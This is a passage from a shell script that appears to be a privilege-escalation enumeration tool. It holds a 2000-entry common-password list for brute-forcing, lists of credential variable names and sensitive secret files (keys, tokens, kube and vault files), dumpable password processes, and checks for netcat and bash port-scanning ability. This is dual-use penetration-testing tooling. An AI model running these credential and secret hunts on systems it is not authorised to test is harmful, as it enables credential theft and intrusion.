pwd_in_variables10="SPA_CLIENT_ID|SPOTIFY_API_ACCESS_TOKEN|SPOTIFY_API_CLIENT_ID|SPOTIFY_API_CLIENT_SECRET|sqsAccessKey|sqsSecretKey|SRCCLR_API_TOKEN|SSHPASS|SSMTP_CONFIG|STARSHIP_ACCOUNT_SID|STARSHIP_AUTH_TOKEN|STAR_TEST_AWS_ACCESS_KEY_ID|STAR_TEST_BUCKET|STAR_TEST_LOCATION|STAR_TEST_SECRET_ACCESS_KEY|STORMPATH_API_KEY_ID|STORMPATH_API_KEY_SECRET|STRIPE_PRIVATE|STRIPE_PUBLIC|STRIP_PUBLISHABLE_KEY|STRIP_SECRET_KEY|SURGE_LOGIN|SURGE_TOKEN|SVN_PASS|SVN_USER|TESCO_API_KEY|THERA_OSS_ACCESS_ID|THERA_OSS_ACCESS_KEY|TRAVIS_ACCESS_TOKEN|TRAVIS_API_TOKEN|TRAVIS_COM_TOKEN|TRAVIS_E2E_TOKEN|TRAVIS_GH_TOKEN|TRAVIS_PULL_REQUEST|TRAVIS_SECURE_ENV_VARS|TRAVIS_TOKEN|TREX_CLIENT_ORGURL|TREX_CLIENT_TOKEN|TREX_OKTA_CLIENT_ORGURL|TREX_OKTA_CLIENT_TOKEN|TWILIO_ACCOUNT_ID|TWILIO_ACCOUNT_SID|TWILIO_API_KEY|TWILIO_API_SECRET|TWILIO_CHAT_ACCOUNT_API_SERVICE|TWILIO_CONFIGURATION_SID|TWILIO_SID|TWILIO_TOKEN|TWITTEROAUTHACCESSSECRET|TWITTEROAUTHACCESSTOKEN|TWITTER_CONSUMER_KEY|TWITTER_CONSUMER_SECRET|UNITY_SERIAL|URBAN_KEY|URBAN_MASTER_SECRET|URBAN_SECRET|userTravis|USER_ASSETS_ACCESS_KEY_ID|USER_ASSETS_SECRET_ACCESS_KEY|VAULT_APPROLE_SECRET_ID|VAULT_PATH|VIP_GITHUB_BUILD_REPO_DEPLOY_KEY|VIP_GITHUB_DEPLOY_KEY|VIP_GITHUB_DEPLOY_KEY_PASS"
pwd_in_variables11="VIRUSTOTAL_APIKEY|VISUAL_RECOGNITION_API_KEY|V_SFDC_CLIENT_ID|V_SFDC_CLIENT_SECRET|WAKATIME_API_KEY|WAKATIME_PROJECT|WATSON_CLIENT|WATSON_CONVERSATION_WORKSPACE|WATSON_DEVICE|WATSON_DEVICE_TOPIC|WATSON_TEAM_ID|WATSON_TOPIC|WIDGET_BASIC_USER_2|WIDGET_BASIC_USER_3|WIDGET_BASIC_USER_4|WIDGET_BASIC_USER_5|WIDGET_FB_USER|WIDGET_FB_USER_2|WIDGET_FB_USER_3|WIDGET_TEST_SERVERWORDPRESS_DB_USER|WORKSPACE_ID|WPJM_PHPUNIT_GOOGLE_GEOCODE_API_KEY|WPT_DB_HOST|WPT_DB_NAME|WPT_DB_USER|WPT_PREPARE_DIR|WPT_REPORT_API_KEY|WPT_SSH_CONNECT|WPT_SSH_PRIVATE_KEY_BASE64|YANGSHUN_GH_TOKEN|YT_ACCOUNT_CHANNEL_ID|YT_ACCOUNT_CLIENT_ID|YT_ACCOUNT_CLIENT_SECRET|YT_ACCOUNT_REFRESH_TOKEN|YT_API_KEY|YT_CLIENT_ID|YT_CLIENT_SECRET|YT_PARTNER_CHANNEL_ID|YT_PARTNER_CLIENT_ID|YT_PARTNER_CLIENT_SECRET|YT_PARTNER_ID|YT_PARTNER_REFRESH_TOKEN|YT_SERVER_API_KEY|ZHULIANG_GH_TOKEN|ZOPIM_ACCOUNT_KEY"

top2000pwds="123456 password 123456789 12345678 12345 qwerty 123123 111111 abc123 1234567 dragon 1q2w3e4r sunshine 654321 master 1234 football 1234567890 000000 computer 666666 superman michael internet iloveyou daniel 1qaz2wsx monkey shadow jessica letmein baseball whatever princess abcd1234 123321 starwars 121212 thomas zxcvbnm trustno1 killer welcome jordan aaaaaa 123qwe freedom password1 charlie batman jennifer 7777777 michelle diamond oliver mercedes benjamin 11111111 snoopy samantha victoria matrix george alexander secret cookie asdfgh 987654321 123abc orange fuckyou asdf1234 pepper hunter silver joshua banana 1q2w3e chelsea 1234qwer summer qwertyuiop phoenix andrew q1w2e3r4 elephant rainbow mustang merlin london garfield robert chocolate 112233 samsung qazwsx matthew buster jonathan ginger flower 555555 test caroline amanda maverick midnight martin junior 88888888 anthony jasmine creative patrick mickey 123 qwerty123 cocacola chicken passw0rd forever william nicole hello yellow nirvana justin friends cheese tigger mother liverpool blink182 asdfghjkl andrea spider scooter richard soccer rachel purple morgan melissa jackson arsenal 222222 qwe123 gabriel ferrari jasper danielle bandit angela scorpion prince maggie austin veronica nicholas monster dexter carlos thunder success hannah ashley 131313 stella brandon pokemon joseph asdfasdf 999999 metallica december chester taylor sophie samuel rabbit crystal barney xxxxxx steven ranger patricia christian asshole spiderman sandra hockey angels security parker heather 888888 victor harley 333333 system slipknot november jordan23 canada tennis qwertyui casper gemini asd123 winter hammer cooper america albert 777777 winner charles butterfly swordfish popcorn penguin dolphin carolina access 987654 hardcore corvette apples 12341234 sabrina remember qwer1234 edward dennis cherry sparky natasha arthur vanessa marina leonardo johnny dallas antonio winston \
snickers olivia nothing iceman destiny coffee apollo 696969 windows williams school madison dakota angelina anderson 159753 1111 yamaha trinity rebecca nathan guitar compaq 123123123 toyota shannon playboy peanut pakistan diablo abcdef maxwell golden asdasd 123654 murphy monica marlboro kimberly gateway bailey 00000000 snowball scooby nikita falcon august test123 sebastian panther love johnson godzilla genesis brandy adidas zxcvbn wizard porsche online hello123 fuckoff eagles champion bubbles boston smokey precious mercury lauren einstein cricket cameron angel admin napoleon mountain lovely friend flowers dolphins david chicago sierra knight yankees wilson warrior simple nelson muffin charlotte calvin spencer newyork florida fernando claudia basketball barcelona 87654321 willow stupid samson police paradise motorola manager jaguar jackie family doctor bullshit brooklyn tigers stephanie slayer peaches miller heaven elizabeth bulldog animal 789456 scorpio rosebud qwerty12 franklin claire american vincent testing pumpkin platinum louise kitten general united turtle marine icecream hacker darkness cristina colorado boomer alexandra steelers serenity please montana mitchell marcus lollipop jessie happy cowboy 102030 marshall jupiter jeremy gibson fucker barbara adrian 1qazxsw2 12344321 11111 startrek fishing digital christine business abcdefg nintendo genius 12qwaszx walker q1w2e3 player legend carmen booboo tomcat ronaldo people pamela marvin jackass google fender asdfghjk Password 1q2w3e4r5t zaq12wsx scotland phantom hercules fluffy explorer alexis walter trouble tester qwerty1 melanie manchester gordon firebird engineer azerty 147258 virginia tiger simpsons passion lakers james angelica 55555 vampire tiffany september private maximus loveme isabelle isabella eclipse dreamer changeme cassie badboy 123456a stanley sniper rocket passport pandora justice infinity cookies barbie xavier unicorn superstar \
stephen rangers orlando money domino courtney viking tucker travis scarface pavilion nicolas natalie gandalf freddy donald captain abcdefgh a1b2c3d4 speedy peter nissan loveyou harrison friday francis dancer 159357 101010 spitfire saturn nemesis little dreams catherine brother birthday 1111111 wolverine victory student france fantasy enigma copper bonnie teresa mexico guinness georgia california sweety logitech julian hotdog emmanuel butter beatles 11223344 tristan sydney spirit october mozart lolita ireland goldfish eminem douglas cowboys control cheyenne alex testtest stargate raiders microsoft diesel debbie danger chance asdf anything aaaaaaaa welcome1 qwert hahaha forest eternity disney denise carter alaska zzzzzz titanic shorty shelby pookie pantera england chris zachary westside tamara password123 pass maryjane lincoln willie teacher pierre michael1 leslie lawrence kristina kawasaki drowssap college blahblah babygirl avatar alicia regina qqqqqq poohbear miranda madonna florence sapphire norman hamilton greenday galaxy frankie black awesome suzuki spring qazwsxedc magnum lovers liberty gregory 232323 twilight timothy swimming super stardust sophia sharon robbie predator penelope michigan margaret jesus hawaii green brittany brenda badger a1b2c3 444444 winnie wesley voodoo skippy shithead redskins qwertyu pussycat houston horses gunner fireball donkey cherokee australia arizona 1234abcd skyline power perfect lovelove kermit kenneth katrina eugene christ thailand support special runner lasvegas jason fuckme butthead blizzard athena abigail 8675309 violet tweety spanky shamrock red123 rascal melody joanna hello1 driver bluebird biteme atlantis arnold apple alison taurus random pirate monitor maria lizard kevin hummer holland buffalo 147258369 007007 valentine roberto potter magnolia juventus indigo indian harvey duncan diamonds daniela christopher bradley bananas warcraft sunset simone renegade \
redsox philip monday mohammed indiana energy bond007 avalon terminator skipper shopping scotty savannah raymond morris mnbvcxz michele lucky lucifer kingdom karina giovanni cynthia a123456 147852 12121212 wildcats ronald portugal mike helpme froggy dragons cancer bullet beautiful alabama 212121 unknown sunflower sports siemens santiago kathleen hotmail hamster golfer future father enterprise clifford christina camille camaro beauty 55555555 vision tornado something rosemary qweasd patches magic helena denver cracker beaver basket atlanta vacation smiles ricardo pascal newton jeffrey jasmin january honey hollywood holiday gloria element chandler booger angelo allison action 99999999 target snowman miguel marley lorraine howard harmony children celtic beatrice airborne wicked voyager valentin thx1138 thumper samurai moonlight mmmmmm karate kamikaze jamaica emerald bubble brooke zombie strawberry spooky software simpson service sarah racing qazxsw philips oscar minnie lalala ironman goddess extreme empire elaine drummer classic carrie berlin asdfg 22222222 valerie tintin therock sunday skywalker salvador pegasus panthers packers network mission mark legolas lacrosse kitty kelly jester italia hiphop freeman charlie1 cardinal bluemoon bbbbbb bastard alyssa 0123456789 zeppelin tinker surfer smile rockstar operator naruto freddie dragonfly dickhead connor anaconda amsterdam alfred a12345 789456123 77777777 trooper skittles shalom raptor pioneer personal ncc1701 nascar music kristen kingkong global geronimo germany country christmas bernard benson wrestling warren techno sunrise stefan sister savage russell robinson oracle millie maddog lightning kingston kennedy hannibal garcia download dollar darkstar brutus bobby autumn webster vanilla undertaker tinkerbell sweetpea ssssss softball rafael panasonic pa55word keyboard isabel hector fisher dominic darkside cleopatra blue assassin amelia vladimir roland \
nigger national monique molly matthew1 godfather frank curtis change central cartman brothers boogie archie warriors universe turkey topgun solomon sherry sakura rush2112 qwaszx office mushroom monika marion lorenzo john herman connect chopper burton blondie bitch bigdaddy amber 456789 1a2b3c4d ultimate tequila tanner sweetie scott rocky popeye peterpan packard loverboy leonard jimmy harry griffin design buddha 1 wallace truelove trombone toronto tarzan shirley sammy pebbles natalia marcel malcolm madeline jerome gilbert gangster dingdong catalina buddy blazer billy bianca alejandro 54321 252525 111222 0000 water sucker rooster potato norton lucky1 loving lol123 ladybug kittycat fuck forget flipper fireman digger bonjour baxter audrey aquarius 1111111111 pppppp planet pencil patriots oxford million martha lindsay laura jamesbond ihateyou goober giants garden diana cecilia brazil blessing bishop bigdog airplane Password1 tomtom stingray psycho pickle outlaw number1 mylove maurice madman maddie lester hendrix hellfire happy1 guardian flamingo enter chichi 0987654321 western twister trumpet trixie socrates singer sergio sandman richmond piglet pass123 osiris monkey1 martina justine english electric church castle caesar birdie aurora artist amadeus alberto 246810 whitney thankyou sterling star ronnie pussy printer picasso munchkin morpheus madmax kaiser julius imperial happiness goodluck counter columbia campbell blessed blackjack alpha 999999999 142536 wombat wildcat trevor telephone smiley saints pretty oblivion newcastle mariana janice israel imagine freedom1 detroit deedee darren catfish adriana washington warlock valentina valencia thebest spectrum skater sheila shaggy poiuyt member jessica1 jeremiah jack insane iloveu handsome goldberg gabriela elijah damien daisy buttons blabla bigboy apache anthony1 a1234567 xxxxxxxx toshiba tommy sailor peekaboo motherfucker montreal manuel madrid kramer \
katherine kangaroo jenny immortal harris hamlet gracie fucking firefly chocolat bentley account 321321 2222 1a2b3c thompson theman strike stacey science running research polaris oklahoma mariposa marie leader julia island idontknow hitman german felipe fatcat fatboy defender applepie annette 010203 watson travel sublime stewart steve squirrel simon sexy pineapple phoebe paris panzer nadine master1 mario kelsey joker hongkong gorilla dinosaur connie bowling bambam babydoll aragorn andreas 456123 151515 wolves wolfgang turner semperfi reaper patience marilyn fletcher drpepper dorothy creation brian bluesky andre yankee wordpass sweet spunky sidney serena preston pauline passwort original nightmare miriam martinez labrador kristin kissme henry gerald garrett flash excalibur discovery dddddd danny collins casino broncos brendan brasil apple123 yvonne wonder window tomato sundance sasha reggie redwings poison mypassword monopoly mariah margarita lionking king football1 director darling bubba biscuit 44444444 wisdom vivian virgin sylvester street stones sprite spike single sherlock sandy rocker robin matt marianne linda lancelot jeanette hobbes fred ferret dodger cotton corona clayton celine cannabis bella andromeda 7654321 4444 werewolf starcraft sampson redrum pyramid prodigy paul michel martini marathon longhorn leopard judith joanne jesus1 inferno holly harold happy123 esther dudley dragon1 darwin clinton celeste catdog brucelee argentina alpine 147852369 wrangler william1 vikings trigger stranger silvia shotgun scarlett scarlet redhead raider qweasdzxc playstation mystery morrison honda february fantasia designer coyote cool bulldogs bernie baby asdfghj angel1 always adam 202020 wanker sullivan stealth skeeter saturday rodney prelude pingpong phillip peewee peanuts peace nugget newport myself mouse memphis lover lancer kristine james1 hobbit halloween fuckyou1 finger fearless dodgers delete cougar \
charmed cassandra caitlin bismillah believe alice airforce 7777 viper tony theodore sylvia suzanne starfish sparkle server samsam qweqwe public pass1234 neptune marian krishna kkkkkk jungle cinnamon bitches 741852 trojan theresa sweetheart speaker salmon powers pizza overlord michaela meredith masters lindsey history farmer express escape cuddles carson candy buttercup brownie broken abc12345 aardvark Passw0rd 141414 124578 123789 12345678910 00000 universal trinidad tobias thursday surfing stuart stinky standard roller porter pearljam mobile mirage markus loulou jjjjjj herbert grace goldie frosty fighter fatima evelyn eagle desire crimson coconut cheryl beavis anonymous andres africa 134679 whiskey velvet stormy springer soldier ragnarok portland oranges nobody nathalie malibu looking lemonade lavender hitler hearts gotohell gladiator gggggg freckles fashion david1 crusader cosmos commando clover clarence center cadillac brooks bronco bonita babylon archer alexandre 123654789 verbatim umbrella thanks sunny stalker splinter sparrow selena russia roberts register qwert123 penguins panda ncc1701d miracle melvin lonely lexmark kitkat julie graham frances estrella downtown doodle deborah cooler colombia chemistry cactus bridge bollocks beetle anastasia 741852963 69696969 unique sweets station showtime sheena santos rock revolution reading qwerasdf password2 mongoose marlene maiden machine juliet illusion hayden fabian derrick crazy cooldude chipper bomber blonde bigred amazing aliens abracadabra 123qweasd wwwwww treasure timber smith shelly sesame pirates pinkfloyd passwords nature marlin marines linkinpark larissa laptop hotrod gambit elvis education dustin devils damian christy braves baller anarchy white valeria underground strong poopoo monalisa memory lizzie keeper justdoit house homer gerard ericsson emily divine colleen chelsea1 cccccc camera bonbon billie bigfoot badass asterix anna animals \
andy achilles a1s2d3f4 violin veronika vegeta tyler test1234 teddybear tatiana sporting spartan shelley sharks respect raven pentium papillon nevermind marketing manson madness juliette jericho gabrielle fuckyou2 forgot firewall faith evolution eric eduardo dagger cristian cavalier canadian bruno blowjob blackie beagle admin123 010101 together spongebob snakes sherman reddog reality ramona puppies pedro pacific pa55w0rd omega noodle murray mollie mister halflife franco foster formula1 felix dragonball desiree default chris1 bunny bobcat asdf123 951753 5555 242424 thirteen tattoo stonecold stinger shiloh seattle santana roger roberta rastaman pickles orion mustang1 felicia dracula doggie cucumber cassidy britney brianna blaster belinda apple1 753951 teddy striker stevie soleil snake skateboard sheridan sexsex roxanne redman qqqqqqqq punisher panama paladin none lovelife lights jerry iverson inside hornet holden groovy gretchen grandma gangsta faster eddie chevelle chester1 carrot cannon button administrator a 1212 zxc123 wireless volleyball vietnam twinkle terror sandiego rose pokemon1 picture parrot movies moose mirror milton mayday maestro lollypop katana johanna hunting hudson grizzly gorgeous garbage fish ernest dolores conrad chickens charity casey blueberry blackman blackbird bill beckham battle atlantic wildfire weasel waterloo trance storm singapore shooter rocknroll richie poop pitbull mississippi kisses karen juliana james123 iguana homework highland fire elliot eldorado ducati discover computer1 buddy1 antonia alphabet 159951 123456789a 1123581321 0123456 zaq1xsw2 webmaster vagina unreal university tropical swimmer sugar southpark silence sammie ravens question presario poiuytrewq palmer notebook newman nebraska manutd lucas hermes gators dave dalton cheetah cedric camilla bullseye bridget bingo ashton 123asd yahoo volume valhalla tomorrow starlight scruffy roscoe richard1 positive \
plymouth pepsi patrick1 paradox milano maxima loser lestat gizmo ghetto faithful emerson elliott dominique doberman dillon criminal crackers converse chrissy casanova blowme attitude"
PASSTRY="2000" # Default num of passwds to try (all by default)

if [ "$PORTS" ] || [ "$DISCOVERY" ] || [ "$IP" ] || [ "$AUTO_NETWORK_SCAN" ]; then MAXPATH_FIND_W="1"; fi # If Network reduce the time on this
SEDOVERFLOW=true
for grp in $(groups $USER 2>/dev/null | cut -d ":" -f2); do
  wgroups="$wgroups -group $grp -or "
done
wgroups="$(echo $wgroups | sed -e 's/ -or$//')"
while $SEDOVERFLOW; do
  #WF=`find /dev /srv /proc /home /media /sys /lost+found /run /etc /root /var /tmp /mnt /boot /opt -type d -maxdepth $MAXPATH_FIND_W -writable -or -user $USER 2>/dev/null | sort`
  #if [ "$MACPEAS" ]; then
    WF=$(find / -maxdepth $MAXPATH_FIND_W -type d ! -path "/proc/*" '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or ')'  2>/dev/null | sort) #OpenBSD find command doesn't have "-writable" option
  #else
  #  WF=`find / -maxdepth $MAXPATH_FIND_W -type d ! -path "/proc/*" -and '(' -writable -or -user $USER ')' 2>/dev/null | sort`
  #fi
  Wfolders=$(printf "%s" "$WF" | tr '\n' '|')"|[a-zA-Z]+[a-zA-Z0-9]* +\*"
  Wfolder="$(printf "%s" "$WF" | grep "/shm" | head -n1)"  # Try to get /dev/shm
  if ! [ "$Wfolder" ]; then
    Wfolder="$(printf "%s" "$WF" | grep "tmp\|shm\|home\|Users\|root\|etc\|var\|opt\|bin\|lib\|mnt\|private\|Applications" | head -n1)"
  fi
  printf "test\ntest\ntest\ntest"| sed -${E} "s,$Wfolders|\./|\.:|:\.,${SED_RED_YELLOW},g" >/dev/null 2>&1
  if [ $? -eq 0 ]; then
      SEDOVERFLOW=false
  else
      MAXPATH_FIND_W=$(($MAXPATH_FIND_W-1)) # If overflow of directories, check again with MAXPATH_FIND_W - 1
  fi
  if [ $MAXPATH_FIND_W -lt 1 ] ; then # Prevents infinite loop
     SEDOVERFLOW=false
  fi
done


notExtensions="\.tif$|\.tiff$|\.gif$|\.jpeg$|\.jpg|\.jif$|\.jfif$|\.jp2$|\.jpx$|\.j2k$|\.j2c$|\.fpx$|\.pcd$|\.png$|\.pdf$|\.flv$|\.mp4$|\.mp3$|\.gifv$|\.avi$|\.mov$|\.mpeg$|\.wav$|\.doc$|\.docx$|\.xls$|\.xlsx$|\.svg$"

TIMEOUT="$(command -v timeout 2>/dev/null)"
STRACE="$(command -v strace 2>/dev/null)"
STRINGS="$(command -v strings 2>/dev/null)"
LDD="$(command -v ldd 2>/dev/null)"
READELF="$(command -v readelf 2>/dev/null)"

shscripsG="/0trace.sh|/alsa-info.sh|amuFormat.sh|/blueranger.sh|/crosh.sh|/dnsmap-bulk.sh|/dockerd-rootless.sh|/dockerd-rootless-setuptool.sh|/get_bluetooth_device_class.sh|/gettext.sh|/go-rhn.sh|/gvmap.sh|/kernel_log_collector.sh|/lesspipe.sh|/lprsetup.sh|/mksmbpasswd.sh|/pm-utils-bugreport-info.sh|/power_report.sh|/prl-opengl-switcher.sh|/setuporamysql.sh|/setup-nsssysinit.sh|/readlink_f.sh|/rescan-scsi-bus.sh|/start_bluetoothd.sh|/start_bluetoothlog.sh|/testacg.sh|/testlahf.sh|/unix-lpr.sh|/url_handler.sh|/write_gpt.sh"

notBackup="/tdbbackup$|/db_hotbackup$"

cronjobsG=".placeholder|0anacron|0hourly|110.clean-tmps|130.clean-msgs|140.clean-rwho|199.clean-fax|199.rotate-fax|200.accounting|310.accounting|400.status-disks|420.status-network|430.status-rwho|999.local|anacron|apache2|apport|apt|aptitude|apt-compat|bsdmainutils|certwatch|cracklib-runtime|debtags|dpkg|e2scrub_all|exim4-base|fake-hwclock|fstrim|john|locate|logrotate|man-db.cron|man-db|mdadm|mlocate|mod-pagespeed|ntp|passwd|php|popularity-contest|raid-check|rwhod|samba|standard|sysstat|ubuntu-advantage-tools|update-motd|update-notifier-common|upstart|"
cronjobsB="centreon"

processesVB='jdwp|tmux |screen | inspect |--inspect[= ]|--inspect$|--inpect-brk|--remote-debugging-port'
processesB="amazon-ssm-agent|knockd|splunk"
processesDump="gdm-password|gnome-keyring-daemon|lightdm|vsftpd|apache2|sshd:"

mail_apps="Postfix|Dovecot|Exim|SquirrelMail|Cyrus|Sendmail|Courier"

profiledG="01-locale-fix.sh|256term.csh|256term.sh|abrt-console-notification.sh|appmenu-qt5.sh|apps-bin-path.sh|bash_completion.sh|cedilla-portuguese.sh|colorgrep.csh|colorgrep.sh|colorls.csh|colorls.sh|colorxzgrep.csh|colorxzgrep.sh|colorzgrep.csh|colorzgrep.sh|csh.local|cursor.sh|gawk.csh|gawk.sh|im-config_wayland.sh|kali.sh|lang.csh|lang.sh|less.csh|less.sh|flatpak.sh|sh.local|vim.csh|vim.sh|vte.csh|vte-2.91.sh|which2.csh|which2.sh|xauthority.sh|Z97-byobu.sh|xdg_dirs_desktop_session.sh|Z99-cloudinit-warnings.sh|Z99-cloud-locale-test.sh"

knw_emails=".*@aivazian.fsnet.co.uk|.*@angband.pl|.*@canonical.com|.*centos.org|.*debian.net|.*debian.org|.*@jff.email|.*kali.org|.*linux.it|.*@linuxia.de|.*@lists.debian-maintainers.org|.*@mit.edu|.*@oss.sgi.com|.*@qualcomm.com|.*redhat.com|.*ubuntu.com|.*@vger.kernel.org|mmyangfl@gmail.com|rogershimizu@gmail.com|thmarques@gmail.com"

timersG="anacron.timer|apt-daily.timer|apt-daily-upgrade.timer|dpkg-db-backup.timer|e2scrub_all.timer|fstrim.timer|fwupd-refresh.timer|geoipupdate.timer|io.netplan.Netplan|logrotate.timer|man-db.timer|mlocate.timer|motd-news.timer|phpsessionclean.timer|plocate-updatedb.timer|snapd.refresh.timer|snapd.snap-repair.timer|systemd-tmpfiles-clean.timer|systemd-readahead-done.timer|ua-license-check.timer|ua-messaging.timer|ua-timer.timer|ureadahead-stop.timer"

commonrootdirsG="^/$|/bin$|/boot$|/.cache$|/cdrom|/dev$|/etc$|/home$|/lost+found$|/lib$|/lib32$|libx32$|/lib64$|lost\+found|/media$|/mnt$|/opt$|/proc$|/root$|/run$|/sbin$|/snap$|/srv$|/sys$|/tmp$|/usr$|/var$"
commonrootdirsMacG="^/$|/.DocumentRevisions-V100|/.fseventsd|/.PKInstallSandboxManager-SystemSoftware|/.Spotlight-V100|/.Trashes|/.vol|/Applications|/bin|/cores|/dev|/home|/Library|/macOS Install Data|/net|/Network|/opt|/private|/sbin|/System|/Users|/usr|/Volumes"

ldsoconfdG="/lib32|/lib/x86_64-linux-gnu|/usr/lib32|/usr/lib/oracle/19.6/client64/lib/|/usr/lib/x86_64-linux-gnu/libfakeroot|/usr/lib/x86_64-linux-gnu|/usr/local/lib/x86_64-linux-gnu|/usr/local/lib"

dbuslistG="^:1\.[0-9\.]+|com.hp.hplip|com.intel.tss2.Tabrmd|com.redhat.ifcfgrh1|com.redhat.NewPrinterNotification|com.redhat.PrinterDriversInstaller|com.redhat.RHSM1|com.redhat.RHSM1.Facts|com.redhat.tuned|com.ubuntu.LanguageSelector|com.ubuntu.SoftwareProperties|com.ubuntu.SystemService|com.ubuntu.USBCreator|com.ubuntu.WhoopsiePreferences|io.netplan.Netplan|io.snapcraft.SnapdLoginService|fi.epitest.hostap.WPASupplicant|fi.w1.wpa_supplicant1|NAME|net.hadess.SwitcherooControl|org.blueman.Mechanism|org.bluez|org.debian.apt|org.fedoraproject.FirewallD1|org.fedoraproject.Setroubleshootd|org.fedoraproject.SetroubleshootFixit|org.fedoraproject.SetroubleshootPrivileged|org.freedesktop.Accounts|org.freedesktop.Avahi|org.freedesktop.bolt|org.freedesktop.ColorManager|org.freedesktop.DBus|org.freedesktop.DisplayManager|org.freedesktop.fwupd|org.freedesktop.GeoClue2|org.freedesktop.hostname1|org.freedesktop.import1|org.freedesktop.locale1|org.freedesktop.login1|org.freedesktop.machine1|org.freedesktop.ModemManager1|org.freedesktop.NetworkManager|org.freedesktop.network1|org.freedesktop.nm_dispatcher|org.freedesktop.nm_priv_helper|org.freedesktop.PackageKit|org.freedesktop.PolicyKit1|org.freedesktop.portable1|org.freedesktop.realmd|org.freedesktop.RealtimeKit1|org.freedesktop.SystemToolsBackends|org.freedesktop.SystemToolsBackends.[a-zA-Z0-9_]+|org.freedesktop.resolve1|org.freedesktop.systemd1|org.freedesktop.thermald|org.freedesktop.timedate1|org.freedesktop.timesync1|org.freedesktop.UDisks2|org.freedesktop.UPower|org.gnome.DisplayManager|org.opensuse.CupsPkHelper.Mechanism"
USEFUL_SOFTWARE="authbind aws az base64 ctr curl doas docker fetch g++ gcc gcloud gdb kubectl lxc make nc nc.traditional ncat netcat nmap perl php ping podman python python2 python2.6 python2.7 python3 python3.6 python3.7 pwsh rkt ruby runc socat sudo wget xterm"
TIP_DOCKER_ROOTLESS="In rootless mode privilege escalation to root will not be possible."
GREP_DOCKER_SOCK_INFOS="Architecture|OSType|Name|DockerRootDir|NCPU|OperatingSystem|KernelVersion|ServerVersion"
GREP_DOCKER_SOCK_INFOS_IGNORE="IndexConfig"
GREP_IGNORE_MOUNTS="/ /|/null | proc proc |/dev/console"

INT_HIDDEN_FILES=".Xauthority|.bashrc|.bluemix|.boto|.cer|.cloudflared|.credentials.json|.crt|.csr|.db|.der|.docker|.env|.erlang.cookie|.flyrc|.ftpconfig|.git|.git-credentials|.gitconfig|.github|.gnupg|.google_authenticator|.gpg|.htpasswd|.irssi|.jks|.k5login|.kdbx|.key|.keyring|.keystore|.keytab|.kube|.ldaprc|.lesshst|.mozilla|.msmtprc|.ovpn|.p12|.password-store|.pem|.pfx|.pgp|.plan|.profile|.psk|.pub|.pypirc|.rdg|.recently-used.xbel|.rhosts|.roadtools_auth|.secrets.mkey|.service|.socket|.sqlite|.sqlite3|.sudo_as_admin_successful|.svn|.swp|.tf|.tfstate|.timer|.vault-token|.vhd|.vhdx|.viminfo|.vmdk|.vnc|.wgetrc"


###########################################
#---------) Checks before start (---------#
###########################################
# --) ps working good
# --) Network binaries

if [ "$(ps auxwww 2>/dev/null | wc -l 2>/dev/null)" -lt 8 ]; then
  NOUSEPS="1"
fi

DISCOVER_BAN_BAD="No network discovery capabilities (fping or ping not found)"
FPING=$(command -v fping 2>/dev/null)
PING=$(command -v ping 2>/dev/null)
if [ "$FPING" ]; then
  DISCOVER_BAN_GOOD="$GREEN$FPING${BLUE} is available for network discovery$LG ($SCRIPTNAME can discover hosts, learn more with -h)"
else
  if [ "$PING" ]; then
    DISCOVER_BAN_GOOD="$GREEN$PING${BLUE} is available for network discovery$LG ($SCRIPTNAME can discover hosts, learn more with -h)"
  fi
fi

SCAN_BAN_BAD="No port scan capabilities (nc and bash not found)"

if [ "$(command -v bash)" ] && ! [ -L "$(command -v bash)" ]; then
  FOUND_BASH=$(command -v bash);
elif [ -f "/bin/bash" ] && ! [ -L "/bin/bash" ]; then
  FOUND_BASH="/bin/bash";
fi
if [ "$FOUND_BASH" ]; then
  SCAN_BAN_GOOD="$YELLOW[+] $GREEN$FOUND_BASH${BLUE} is available for network discovery, port scanning and port forwarding$LG ($SCRIPTNAME can discover hosts, scan ports, and forward ports. Learn more with -h)\n"
fi

FOUND_NC=$(command -v nc 2>/dev/null)
if [ -z "$FOUND_NC" ]; then
	FOUND_NC=$(command -v netcat 2>/dev/null);
fi
if [ -z "$FOUND_NC" ]; then
	FOUND_NC=$(command -v ncat 2>/dev/null);
fi
if [ -z "$FOUND_NC" ]; then
	FOUND_NC=$(command -v nc.traditional 2>/dev/null);
fi
if [ -z "$FOUND_NC" ]; then
	FOUND_NC=$(command -v nc.openbsd 2>/dev/null);
fi
if [ "$FOUND_NC" ]; then
  SCAN_BAN_GOOD="$SCAN_BAN_GOOD$YELLOW[+] $GREEN$FOUND_NC${BLUE} is available for network discovery & port scanning$LG ($SCRIPTNAME can discover hosts and scan ports, learn more with -h)\n"
fi


###########################################
#-----------) Main Functions (------------#
###########################################

echo_not_found (){
  printf $DG"$1 Not Found\n"$NC
}

warn_exec(){
  $* 2>/dev/null || echo_not_found $1
}

echo_no (){
  printf $DG"No\n"$NC
}

print_title(){
  if [ "$DEBUG" ]; then
    END_T2_TIME=$(date +%s 2>/dev/null)
    if [ "$START_T2_TIME" ]; then
      TOTAL_T2_TIME=$(($END_T2_TIME - $START_T2_TIME))
      printf $DG"This check took $TOTAL_T2_TIME seconds\n"$NC
    fi

    END_T1_TIME=$(date +%s 2>/dev/null)
    if [ "$START_T1_TIME" ]; then
      TOTAL_T1_TIME=$(($END_T1_TIME - $START_T1_TIME))
      printf $DG"The total section execution took $TOTAL_T1_TIME seconds\n"$NC
      echo ""
    fi

    START_T1_TIME=$(date +%s 2>/dev/null)
  fi

  title=$1
  title_len=$(echo $title | wc -c)
  max_title_len=80
  rest_len=$((($max_title_len - $title_len) / 2))

  printf ${BLUE}
  for i in $(seq 1 $rest_len); do printf " "; done
  printf "╔"
  for i in $(seq 1 $title_len); do printf "═"; done; printf "═";
  printf "╗"

  echo ""

  for i in $(seq 1 $rest_len); do printf "═"; done
  printf "╣ $GREEN${title}${BLUE} ╠"
  for i in $(seq 1 $rest_len); do printf "═"; done

  echo ""

  printf ${BLUE}
  for i in $(seq 1 $rest_len); do printf " "; done
  printf "╚"
  for i in $(seq 1 $title_len); do printf "═"; done; printf "═";
  printf "╝"

  printf $NC
  echo ""
}

print_2title(){
  if [ "$DEBUG" ]; then
    END_T2_TIME=$(date +%s 2>/dev/null)
    if [ "$START_T2_TIME" ]; then
      TOTAL_T2_TIME=$(($END_T2_TIME - $START_T2_TIME))
      printf $DG"This check took $TOTAL_T2_TIME seconds\n"$NC
      echo ""
    fi

    START_T2_TIME=$(date +%s 2>/dev/null)
  fi

  printf ${BLUE}"╔══════════╣ $GREEN$1\n"$NC # There are 10 "═"
}

print_3title(){
